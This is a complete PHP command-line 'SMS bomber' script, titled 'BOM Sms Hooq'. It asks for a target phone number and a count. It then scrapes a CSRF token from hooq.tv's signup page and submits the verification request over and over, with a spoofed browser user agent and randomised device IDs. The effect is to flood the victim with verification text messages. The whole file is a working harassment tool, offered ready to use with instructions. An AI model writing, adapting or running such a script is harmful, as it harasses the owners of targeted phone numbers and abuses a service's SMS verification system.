p<?php
error_reporting(0);
Class Bom {
public $no;
public function sendC($url, $page, $params) {
$ch=curl_init();
curl_setopt ($ch, CURLOPT_URL, $url.$page); 
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
if(!empty($params)) {
curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt ($ch, CURLOPT_POST, 1); 
}
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
$headers=array();
$headers[]='Content-Type: application/x-www-form-urlencoded; charset=utf-8';
$headers[]='X-Requested-With: XMLHttpRequest';
curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);    
curl_setopt ($ch, CURLOPT_HEADER, 1);
$result=curl_exec ($ch);
curl_close($ch);
return $result;
}
private function getStr($start, $end, $string) {
if(!empty($string)) {
$setring = explode($start,$string);
$setring = explode($end,$setring[1]);
return $setring[0];
}
}
public function angka($length = 4) {
$characters='0123456789';
$charactersLength=strlen($characters);
$randomString='';
for($i = 0; $i < $length; $i++) {
$randomString .= $characters[rand(0, $charactersLength - 1)];
}
return $randomString;   
}
public function Verif() {
$url="https://www.hooq.tv/signup";
$no=$this->no;
$getkey=$this->sendC("https://www.hooq.tv/id/signup", null, null);
$key=$this->getStr('name="_csrf" value="','" />',$getkey);
$data="_csrf={$key}&device_id=56ad6be9-cd02-{$this->angka()}-{$this->angka()}-d4f2435ef6e8&country_code=%2B62&mobile={$no}";
$send=$this->sendC($url, null, $data);
if(preg_match('/SMS Kode Verifikasi Kamu sudah terkirim ke/', $send)) {
echo "\n\e[92mHAC Send Succes!";
flush();
ob_flush();
sleep(1);
}else {
echo "\n\e[91mHAC Send Failed!";
flush();
ob_flush();
sleep(1);
}
}    
}
echo"\n\e[93m 
   _____                 _           
  / ____|               | |          
 | (___   __ _ _ __   __| |_ __ ___  
  \___ \ / _` | '_ \ / _` | '__/ _ \ 
  ____) | (_| | | | | (_| | | | (_) |
 |_____/ \__,_|_| |_|\__,_|_|  \___/
              _         
             | |    
  _ __  _   _| |_ _ __ __ _  __ _ 
 | '_ \| | | | __| '__/ _` |/ _` |
 | |_) | |_| | |_| | | (_| | (_| |
 | .__/ \__,_|\__|_|  \__,_|\__,_|
 | |                              
 |_|                               
\e";

echo "\n\e[93m
\e[36m===========\e[91m>>>>>>>>>>\n\e[36
mBOM Sms Hooq
Original Sc PHP by : Handika Pratama
Reedit By : @Sandro.putraa
\e[36m===========\e[91m>>>>>>>>>>";

echo "\n\e[93m
\e[75mCara Penggunaan\e[91m>>>>>>>>\n\e[91
minput no target (8.........)";
echo "\n\e[36mTarget  : ";
$target=trim(fgets(STDIN, 1024));
echo "Count   : ";
$jumlah=trim(fgets(STDIN, 1024));
$init=new Bom();
$init->no="$target";
$loop="$jumlah";
for($i=0; $i < $loop; $i++) { 
$init->Verif($init->no);
}
?>